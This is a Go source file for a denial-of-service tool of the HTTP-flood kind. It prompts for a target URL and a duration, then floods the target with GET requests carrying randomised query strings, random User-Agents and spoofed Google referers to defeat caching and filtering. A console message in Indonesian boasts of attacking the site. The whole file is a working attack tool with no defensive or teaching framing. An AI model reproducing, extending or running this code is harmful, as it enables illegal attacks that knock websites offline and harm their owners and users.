package main

import (
	"bufio"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/corpix/uarand"
	"github.com/gookit/color"
)

var (
	referers = []string{
		"https://www.google.com/?q=",
		"https://www.google.co.uk/?q=",
		"https://www.google.de/?q=",
		"https://www.google.fr/?q=",
		"https://www.google.it/?q=",
		"https://www.google.es/?q=",
		"https://www.google.ru/?q=",
		"https://www.google.cn/?q=",
		"https://www.google.co.jp/?q=",
		"https://www.google.com.br/?q=",
		"https://www.google.co.in/?q=",
		"https://www.google.com.au/?q=",
		"https://www.google.ca/?q=",
		"https://www.google.co.id/?q=",
		"https://www.google.nl/?q=",
		"https://www.google.se/?q=",
		"https://www.google.no/?q=",
		"https://www.google.dk/?q=",
		"https://www.google.pl/?q=",
		"https://www.google.pt/?q=",
		"https://www.google.gr/?q=",
		"https://www.google.hu/?q=",
		"https://www.google.at/?q=",
		"https://www.google.ch/?q=",
		"https://www.google.be/?q=",
		"https://www.google.co.za/?q=",
		"https://www.google.co.kr/?q=",
		"https://www.google.co.mx/?q=",
		"https://www.google.co.th/?q=",
		"https://www.google.com.tw/?q=",
		"https://www.google.com.hk/?q=",
	}
	host         string
	param_joiner string
	reqCount     uint64
	duration     time.Duration
	stopFlag     int32
)

func buildblock(size int) (s string) {
	var a []rune
	for i := 0; i < size; i++ {
		a = append(a, rune(rand.Intn(25)+65))
	}
	return string(a)
}

func get() {
	if strings.ContainsRune(host, '?') {
		param_joiner = "&"
	} else {
		param_joiner = "?"
	}

	c := http.Client{
		Timeout: 3500 * time.Millisecond,
	}

	req, err := http.NewRequest("GET", host+param_joiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
	if err != nil {
		fmt.Println(err)
	}

	req.Header.Set("User-Agent", uarand.GetRandom())
	req.Header.Add("Pragma", "no-cache")
	req.Header.Add("Cache-Control", "no-store, no-cache")
	req.Header.Set("Referer", referers[rand.Intn(len(referers))]+buildblock(rand.Intn(5)+5))
	req.Header.Set("Keep-Alive", string(rand.Intn(10)+100))
	req.Header.Set("Connection", "keep-alive")

	resp, err := c.Do(req)

	atomic.AddUint64(&reqCount, 1)

	if os.IsTimeout(err) {
		color.Red.Println("Connection timed out err")
	} else {
		color.Green.Println("Mati Kau Bangsat Web Kau Di Attacking DDOS Porn To : ", host)
	}

	if err != nil {
		return
	}

	defer resp.Body.Close()
}

func loop() {
	for {
		if atomic.LoadInt32(&stopFlag) == 1 {
			return
		}
		go get()
		time.Sleep(1 * time.Millisecond)
	}
}

func main() {
	reader := bufio.NewReader(os.Stdin)

	fmt.Print("Enter host address (e.g., https://example.com): ")
	hostInput, _ := reader.ReadString('\n')
	host = strings.TrimSpace(hostInput)

	fmt.Print("Enter duration for which the requests should be sent (e.g., 10s or 1m): ")
	durationInput, _ := reader.ReadString('\n')
	durationInput = strings.TrimSpace(durationInput)

	var err error
	duration, err = time.ParseDuration(durationInput)
	if err != nil {
		color.Red.Println("Invalid duration format. Please use a valid duration format (e.g., 10s or 1m).")
		os.Exit(1)
	}

	if len(host) == 0 {
		color.Red.Println("Missing host address.")
		os.Exit(1)
	}

	if duration <= 0 {
		color.Red.Println("Invalid duration. Please specify a positive duration.")
		os.Exit(1)
	}

	color.Yellow.Println("Press Ctrl+C to stop")
	time.Sleep(2 * time.Second)

	start := time.Now()

	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		atomic.StoreInt32(&stopFlag, 1)
	}()

	for i := 0; i < 2; i++ {
		go loop()
	}

	time.Sleep(duration)
	color.Blue.Println("\nSuccess to Broadcast =>", atomic.LoadUint64(&reqCount), "requests in", time.Since(start))
}
